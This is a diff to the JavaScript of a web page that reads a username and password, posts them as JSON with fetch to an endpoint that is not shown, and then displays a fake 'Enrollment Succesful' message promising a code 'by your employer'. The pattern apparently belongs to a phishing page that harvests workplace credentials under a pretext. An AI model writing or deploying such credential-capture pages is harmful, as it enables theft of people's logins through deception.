@@ -11,11 +11,25 @@ const greetings = document.querySelector('.greetings')
 greetings.innerHTML = `<h2>Good ${greeting}</h2>`
 
 
+const mainBody = document.querySelector('#main-body')
 const userName = document.querySelector('#username')
 const password = document.querySelector('#password')
 const btn = document.querySelector('button')
 
-btn.addEventListener('click', () => {
+
+function message(){
+    const h1 = document.createElement('h1')
+    h1.classList.add('end')
+    h1.appendChild(document.createTextNode(`Enrollment Succesful, you'll be sent a code shortly to complete your request by your employer`))
+    setTimeout(() => {
+        mainBody.parentElement.appendChild(h1);
+        setTimeout(() => (h1.style.opacity = 1), 50);
+    }, 1000);
+}
+
+
+function submit(){
+    mainBody.className = 'close'
     const obj = {
         user : userName.value,
         key : password.value
@@ -29,4 +43,20 @@ btn.addEventListener('click', () => {
         },
         body: JSON.stringify(obj)
     })
+    message()
+}
+
+document.addEventListener('DOMContentLoaded', userName.focus())
+userName.addEventListener('keyup', e => {
+    if(e.keyCode == 13){
+        event.preventDefault()
+        password.focus()
+    }
 })
+password.addEventListener('keyup', e => {
+    if(e.keyCode == 13){
+        event.preventDefault()
+        submit()
+    }
+})
+btn.addEventListener('click', submit)
